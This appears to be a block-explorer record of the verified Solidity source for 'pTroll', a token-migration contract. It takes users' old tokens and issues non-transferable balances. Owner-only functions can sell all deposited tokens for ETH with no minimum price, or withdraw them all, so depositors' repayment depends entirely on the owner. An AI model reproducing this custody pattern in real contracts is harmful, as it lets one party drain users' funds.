{"SourceCode": "{\"pTroll.sol\":{\"content\":\"//SPDX-License-Identifier: MIT\\n\\npragma solidity 0.8.12;\\n\\ninterface IERC20 {\\n    function decimals() external view returns (uint8);\\n\\n    function symbol() external view returns (string memory);\\n\\n    function name() external view returns (string memory);\\n\\n    function totalSupply() external view returns (uint256);\\n\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    function allowance(\\n        address owner,\\n        address spender\\n    ) external view returns (uint256);\\n\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    function migrators() external returns (address[] memory);\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n}\\n\\ninterface IUniswapV2Router01 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidityETH(\\n        address token,\\n        uint256 amountTokenDesired,\\n        uint256 amountTokenMin,\\n        uint256 amountETHMin,\\n        address to,\\n        uint256 deadline\\n    )\\n        external\\n        payable\\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\\n}\\n\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\n    function getAmountsOut(\\n        uint amountIn,\\n        address[] memory path\\n    ) external view returns (uint[] memory amounts);\\n\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\\ninterface IUniswapV2Factory {\\n    function createPair(\\n        address tokenA,\\n        address tokenB\\n    ) external returns (address pair);\\n}\\n\\ncontract pTroll is IERC20 {\\n    string public name = \\\"pTrollface\\\";\\n    string public symbol = \\\"pTroll\\\";\\n    uint8 public decimals = 9;\\n    uint256 public totalSupply = 420690000000000 * 10 ** decimals;\\n\\n    address[] private _migrators;\\n\\n    mapping(address =\\u003e uint256) public balanceOf;\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) public allowance;\\n\\n    mapping(address =\\u003e bool) exists;\\n    address private owner;\\n    address public v2TrollTokenAddress;\\n    address public v3TrollTokenAddress;\\n\\n    IUniswapV2Router02 public uniswapV2Router;\\n    address public uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\\n\\n    uint256 public totalMigrated;\\n\\n    bool v3MigrationsOpen;\\n\\n    struct UserInfo {\\n        address owner;\\n        uint256 balance;\\n    }\\n\\n    constructor(address _oldTokenAddress) {\\n        v2TrollTokenAddress = _oldTokenAddress;\\n        balanceOf[address(this)] = totalSupply;\\n        owner = msg.sender;\\n\\n        IERC20 v2Troll = IERC20(v2TrollTokenAddress);\\n\\n        require(\\n            v2Troll.approve(uniRouter, type(uint256).max),\\n            \\\"Unable to approve\\\"\\n        );\\n\\n        uniswapV2Router = IUniswapV2Router02(uniRouter);\\n    }\\n\\n    function onlyOwner() private view {\\n        require(msg.sender == owner, \\\"Not owner\\\");\\n    }\\n\\n    function migrators() external view returns (address[] memory) {\\n        return _migrators;\\n    }\\n\\n    function approve(\\n        address spender,\\n        uint256 amount\\n    ) public override returns (bool) {\\n        return false;\\n    }\\n\\n    function transfer(\\n        address to,\\n        uint256 amount\\n    ) external override returns (bool) {\\n        return false;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external override returns (bool) {\\n        return false;\\n    }\\n\\n    function _sendPTroll(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) private returns (bool) {\\n        balanceOf[from] -= amount;\\n        balanceOf[to] += amount;\\n\\n        return true;\\n    }\\n\\n    function _getImmigrants() private view returns (UserInfo[] memory) {\\n        UserInfo[] memory _users = new UserInfo[](_migrators.length);\\n\\n        for (uint256 i; i \\u003c _migrators.length; i++) {\\n            UserInfo memory user;\\n            user.owner = _migrators[i];\\n            user.balance = balanceOf[user.owner];\\n            _users[i] = user;\\n        }\\n\\n        return _users;\\n    }\\n\\n    function getImmigrants() external view returns (UserInfo[] memory) {\\n        UserInfo[] memory _users = new UserInfo[](_migrators.length);\\n\\n        for (uint256 i; i \\u003c _migrators.length; i++) {\\n            UserInfo memory user;\\n            user.owner = _migrators[i];\\n            user.balance = balanceOf[user.owner];\\n            _users[i] = user;\\n        }\\n\\n        return _users;\\n    }\\n\\n    function migrate(uint256 amount) external returns (bool) {\\n        IERC20 v2Troll = IERC20(v2TrollTokenAddress);\\n        uint256 trollBalance = v2Troll.balanceOf(msg.sender);\\n\\n        require(amount \\u003c= trollBalance, \\\"Cannot transfer more than balance\\\");\\n        require(amount \\u003e 0, \\\"Balance needs to be greater than 0\\\");\\n        require(\\n            v2Troll.transferFrom(msg.sender, address(this), amount),\\n            \\\"Error transferring from\\\"\\n        );\\n        require(\\n            _sendPTroll(address(this), msg.sender, amount),\\n            \\\"Error transferring to\\\"\\n        );\\n\\n        totalMigrated += amount;\\n\\n        if (!exists[msg.sender]) {\\n            exists[msg.sender] = true;\\n            _migrators.push(msg.sender);\\n        }\\n        return true;\\n    }\\n\\n    function migrateToV3(uint256 amount) external returns (bool) {\\n        require(v3MigrationsOpen, \\\"Migrations not open\\\");\\n        uint256 trollBalance = balanceOf[msg.sender];\\n        IERC20 v3Troll = IERC20(v3TrollTokenAddress);\\n\\n        require(amount \\u003c= trollBalance, \\\"Cannot transfer more than balance\\\");\\n        require(amount \\u003e 0, \\\"Balance needs to be greater than 0\\\");\\n        require(\\n            _sendPTroll(msg.sender, address(this), amount),\\n            \\\"Error transferring from\\\"\\n        );\\n        require(v3Troll.transfer(msg.sender, amount), \\\"Error transferring to\\\");\\n\\n        return true;\\n    }\\n\\n    function airdrop() external returns (bool) {\\n        onlyOwner();\\n        IERC20 v3Troll = IERC20(v3TrollTokenAddress);\\n        UserInfo[] memory _users = _getImmigrants();\\n\\n        for (uint256 i; i \\u003c _migrators.length; i++) {\\n            if (_users[i].balance == 0) {\\n                continue;\\n            }\\n            require(\\n                v3Troll.transferFrom(\\n                    msg.sender,\\n                    _users[i].owner,\\n                    _users[i].balance\\n                )\\n            );\\n            balanceOf[_migrators[i]] -= _users[i].balance;\\n        }\\n        return true;\\n    }\\n\\n    function dumpTokens() external returns (bool) {\\n        onlyOwner();\\n        IERC20 v2Troll = IERC20(v2TrollTokenAddress);\\n        uint256 trollBalance = v2Troll.balanceOf(address(this));\\n\\n        uint256 availableEthBefore = address(msg.sender).balance;\\n\\n        address[] memory path = new address[](2);\\n        path[0] = v2TrollTokenAddress;\\n        path[1] = uniswapV2Router.WETH();\\n\\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            trollBalance,\\n            0,\\n            path,\\n            owner,\\n            block.timestamp + 15\\n        );\\n\\n        uint256 availableEthAfter = address(msg.sender).balance;\\n\\n        require(availableEthAfter \\u003e availableEthBefore, \\\"Balance not greater\\\");\\n\\n        return true;\\n    }\\n\\n    function rescueV2Tokens() external returns (bool) {\\n        onlyOwner();\\n        IERC20 v2Troll = IERC20(v2TrollTokenAddress);\\n        uint256 trollBalance = v2Troll.balanceOf(address(this));\\n\\n        require(v2Troll.transfer(owner, trollBalance), \\\"Could not transfer\\\");\\n        return true;\\n    }\\n\\n    function openV3Migrations() external returns (bool) {\\n        onlyOwner();\\n        v3MigrationsOpen = true;\\n        return true;\\n    }\\n\\n    function setV3Address(address _v3Address) external returns (bool) {\\n        onlyOwner();\\n        v3TrollTokenAddress = _v3Address;\\n        return true;\\n    }\\n}\\n\"},\"SafeMath.sol\":{\"content\":\"pragma solidity 0.8.12;\\n\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n\\n  /**\\n  * @dev Multiplies two numbers, throws on overflow.\\n  */\\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\\n    if (a == 0) {\\n      return 0;\\n    }\\n    c = a * b;\\n    assert(c / a == b);\\n    return c;\\n  }\\n\\n  /**\\n  * @dev Integer division of two numbers, truncating the quotient.\\n  */\\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n    // assert(b \\u003e 0); // Solidity automatically throws when dividing by 0\\n    // uint256 c = a / b;\\n    // assert(a == b * c + a % b); // There is no case in which this doesn\\u0027t hold\\n    return a / b;\\n  }\\n\\n  /**\\n  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\\n  */\\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n    assert(b \\u003c= a);\\n    return a - b;\\n  }\\n\\n  /**\\n  * @dev Adds two numbers, throws on overflow.\\n  */\\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\\n    c = a + b;\\n    assert(c \\u003e= a);\\n    return c;\\n  }\\n}\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_oldTokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"airdrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dumpTokens\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getImmigrants\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"internalType\":\"struct pTroll.UserInfo[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"migrate\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"migrateToV3\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"migrators\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openV3Migrations\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rescueV2Tokens\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_v3Address\",\"type\":\"address\"}],\"name\":\"setV3Address\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMigrated\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniRouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"v2TrollTokenAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"v3TrollTokenAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "pTroll", "CompilerVersion": "v0.8.12+commit.f00d7308", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000abc21d9d0cbf329e6aaeec434bdbdab1c8004d5a", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://24023443c57fb18a1a95252bd176babd87914ede8d3639198b454b34d30b4cac"}